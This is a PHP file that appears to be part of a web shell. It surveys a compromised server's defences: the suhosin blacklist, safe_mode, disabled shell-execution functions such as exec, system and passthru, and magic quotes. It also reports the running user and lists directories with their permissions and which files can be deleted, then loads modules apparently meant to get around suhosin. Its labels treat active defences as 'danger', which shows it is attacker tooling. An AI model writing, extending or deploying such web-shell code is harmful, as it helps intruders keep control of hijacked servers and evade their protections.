<?php

function banned_funcs() // we could cache this
{
	$banned = array();

	if (extension_loaded('suhosin'))
	{
		// suhosin returns true to function_exists calls
		// so we have to check if funcs are banned ourselves
		$suhosin = @ini_get("suhosin.executor.func.blacklist");
		if (!empty($suhosin))
		{
			$suhosin = array_map('strtolower', array_map('trim', explode(',', $suhosin)));
			$banned = array_merge($suhosin, $banned);
		}
	}

	if(@ini_get("safe_mode") != false)
	{
		$banned = array_merge($banned, explode(",", "passthru,popen,proc_open,shell_exec,exec,system"));
	}

	if(1)
	{
		$disable = @ini_get("disable_functions");
		if(!empty($disable))
		{
			$disable = array_map('strtolower', array_map('trim', explode(',', $disable)));
			$banned = array_merge($disable, $banned);
		}
	}

	return $banned;
}

function func_exists($func)
{
	return (function_exists($func) == true && array_search($func, banned_funcs()) === false);
}

function try_call_func()
{
	$args = func_get_args();
	$function = $args[0];
	unset($args[0]);

	if(func_exists($function))
	{
		return call_user_func_array($function, $args);
	}

	return NULL;
}

function safe_uname()
{
	return try_call_func("php_uname");	
}

function safe_id()
{
	$uid = try_call_func("posix_geteuid");
	$gid = try_call_func("posix_getegid");
	$name = try_call_func("posix_getpwuid", $uid)["name"];
	$group_name = try_call_func("posix_getgrgid", $gid)["name"];

	return "uid=$uid($name) gid=$gid($group_name)";
}

function list_countermeasures()
{
	$suhosin = extension_loaded('suhosin') === true ? "ON" : "OFF";
	$safe_mode = @ini_get("safe_mode") !== false ? "ON" : "OFF";
	$magic_quotes = get_magic_quotes_gpc() === true ? "ON (but useless)" : "OFF";
	return "suhosin is $suhosin / safe_mode is $safe_mode / magic quotes are $magic_quotes";
}

function colorize_on_off($text)
{
	$text = str_replace("ON", "<span class=\"text-danger\">ON</span>", $text);
	$text = str_replace("OFF", "<span class=\"text-success\">OFF</span>", $text);
	return $text;
}

function set_response($response)
{
	$GLOBALS["SHELL_RESPONSE"] = $response;
}

function list_banned()
{
	$funcs = banned_funcs();
	$not_all_pcntl = false;

	foreach($funcs as $func)
	{
		if (!(strpos($func, 'pcntl_') !== false) && strlen($func) != 0)
		{
			$not_all_pcntl = true;
			break;
		}
	}

	if($not_all_pcntl == false)
	{
		return "Nothing besides pcntl_*, should be OK";
	}

	$funcs = implode(", ", $funcs);
	$funcs = empty($funcs) ? "Nothing banned, very happy" : $funcs;
	return $funcs;
}

function list_dir($directory)
{
	if (is_dir($directory))
	{
		$result = array();
		$files = array_diff(try_call_func("scandir", $directory), array('.','..'));

		$result[] = list_dir_result_for_file($directory, "..");
		foreach($files as $entry)
		{
			$result[] = list_dir_result_for_file($directory, $entry);
		}

		return $result;
	}

	return null;
}

function list_dir_result_for_file($directory, $entry)
{
	$i = $directory . '/' . $entry;
	$stat = try_call_func("stat", $i);
	return array(
		'last_modified' => $stat['mtime'],
		'size' => human_file_size($stat['size']),
		'perms' => sprintf("%o", ($stat['mode'] & 000777)),
		'name' => basename($i),
		'path' => realpath($i),
		'owner' => try_call_func("posix_getpwuid", $stat["uid"])["name"] . "/" . try_call_func("posix_getgrgid", $stat["gid"])["name"],
		'is_dir' => is_dir($i),
		'is_deleteable' => (!is_dir($i) && is_writable($directory)) || 
							(is_dir($i) && is_writable($directory) && is_dir_deletable($i)),
		'is_readable' => is_readable($i),
		'is_writable' => is_writable($i),
		'is_executable' => is_executable($i),
	);
}

function human_file_size($size,$unit="")
{
	if( (!$unit && $size >= 1<<30) || $unit == "GB")
		return number_format($size/(1<<30),2)."GB";
	if( (!$unit && $size >= 1<<20) || $unit == "MB")
		return number_format($size/(1<<20),2)."MB";
	if( (!$unit && $size >= 1<<10) || $unit == "KB")
		return number_format($size/(1<<10),2)."KB";
	
	return number_format($size)." bytes";
}

function is_dir_deletable($d)
{
	$stack = array($d);

	while($dir = array_pop($stack))
	{
		if(!is_readable($dir) || !is_writable($dir)) 
			return false;

		$files = array_diff(try_call_func("scandir", $dir), array('.','..'));
		foreach($files as $file) if(is_dir($file))
		{
			$stack[] = "$dir/$file";
		}
	}

	return true;
}

include_or_detect("shell", "magicquotes");
include_or_detect("shell", "fuhosinexec");

?>